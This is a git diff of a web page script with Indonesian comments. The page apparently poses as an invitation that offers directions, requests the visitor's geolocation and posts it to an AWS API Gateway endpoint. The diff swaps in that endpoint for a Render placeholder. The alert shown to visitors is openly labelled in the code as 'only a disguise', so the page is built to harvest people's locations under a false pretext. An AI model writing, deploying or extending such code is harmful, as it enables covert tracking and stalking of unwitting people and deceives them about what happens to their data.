@@ -1,7 +1,8 @@
 // Di public/script.js Anda
 
-// Ganti dengan URL backend Anda yang sudah di-deploy (misal: dari Render)
-const BACKEND_URL = "https://nama-backend-anda.onrender.com"; // Contoh URL dari Render
+// Ganti dengan URL API Gateway yang Anda dapatkan dari AWS
+const BACKEND_URL =
+  "https://k8927ehsk1.execute-api.ap-southeast-2.amazonaws.com/default/undangan"; // Contoh URL dari AWS API Gateway
 
 document.getElementById("allowLocation").addEventListener("click", function () {
   if (navigator.geolocation) {
@@ -23,7 +24,8 @@ async function successCallback(position) {
   console.log("Lokasi berhasil didapatkan:", latitude, longitude);
 
   try {
-    const response = await fetch(`${BACKEND_URL}/send-location`, {
+    const response = await fetch(BACKEND_URL, {
+      // Perhatikan tidak ada /send-location tambahan di sini jika sudah ada di URL
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -35,18 +37,18 @@ async function successCallback(position) {
       alert(
         "Terima kasih, panduan arah akan segera ditampilkan (ini hanya penyamaran).",
       );
-      console.log("Lokasi berhasil dikirim ke backend.");
+      console.log("Lokasi berhasil dikirim ke backend AWS.");
     } else {
       const errorData = await response.json();
       alert(
         "Maaf, terjadi kesalahan saat mengirim lokasi: " +
           (errorData.message || "Unknown error."),
       );
-      console.error("Gagal mengirim lokasi ke backend:", errorData);
+      console.error("Gagal mengirim lokasi ke backend AWS:", errorData);
     }
   } catch (error) {
     alert("Maaf, terjadi kesalahan jaringan atau server tidak merespons.");
-    console.error("Error saat mengirim data lokasi:", error);
+    console.error("Error saat mengirim data lokasi ke AWS:", error);
   }
 }
 
